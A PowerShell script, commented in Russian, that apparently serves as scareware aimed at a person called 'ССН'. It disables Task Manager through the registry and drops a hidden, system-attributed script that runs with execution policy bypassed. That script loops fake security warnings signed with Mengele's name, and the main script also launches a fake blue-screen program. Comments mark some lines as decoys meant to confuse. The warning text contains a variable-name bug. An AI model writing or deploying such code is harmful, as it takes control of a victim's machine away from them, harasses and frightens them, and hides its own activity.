param (
    [string]$WallpaperPath = "C:\ProgramData\Kostyan\kostyan_wallpaper.jpg"
)

# Фейковый комментарий для запутывания
# ССН, ты не ТССН, не трынди! 😈

# Меняем обои, если файл существует
if (Test-Path $WallpaperPath) {
    $code = @"
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    Add-Type -TypeDefinition $code
    [Wallpaper]::SystemParametersInfo(20, 0, $WallpaperPath, 3)
}

# Отключаем диспетчер задач через реестр
try {
    New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
} catch {
    # Фейковая ошибка для запутывания
    Write-Output "Ошибка 0xDEADBEEF: ССН, ты не пройдёшь!"
}

# Создаём уведомления
$notificationScript = @"
while (`$true) {
    `$processes = @('explorer.exe', 'svchost.exe', 'chrome.exe', 'firefox.exe', 'notepad.exe')
    `$randomProcess = `$processes | Get-Random
    Add-Type -AssemblyName System.Windows.Forms
    `$notify = New-Object System.Windows.Forms.NotifyIcon
    `$notify.Icon = [System.Drawing.SystemIcons]::Warning
    `$notify.BalloonTipTitle = 'Доктор Менгеле: Предупреждение!'
    `$notify.BalloonTipText = "Обнаружен подозрительный процесс: `$_randomProcess`nРекомендуем завершить его через диспетчер задач! 😈"
    `$notify.Visible = `$true
    `$notify.ShowBalloonTip(5000)
    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)
    `$notify.Dispose()
}
"@
$notificationPath = "C:\ProgramData\DrMengele\notification.ps1"
$notificationScript | Out-File -FilePath $notificationPath -Encoding UTF8
attrib +h +s $notificationPath
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $notificationPath -WindowStyle Hidden"

# Запускаем BSOD, если он ещё не запущен
$bsodPath = "C:\ProgramData\DrMengele\bsod.exe"
if (Test-Path $bsodPath) {
    $bsodRunning = Get-Process | Where-Object { $_.Path -eq $bsodPath }
    if (-not $bsodRunning) {
        Start-Process -FilePath $bsodPath -WindowStyle Hidden
    }
}

# Фейковые действия для запутывания
$fakeVar = Get-Random -Minimum 1 -Maximum 100
if ($fakeVar -gt 50) {
    Write-Output "Фейковая команда выполнена, ССН, не ведись!"
}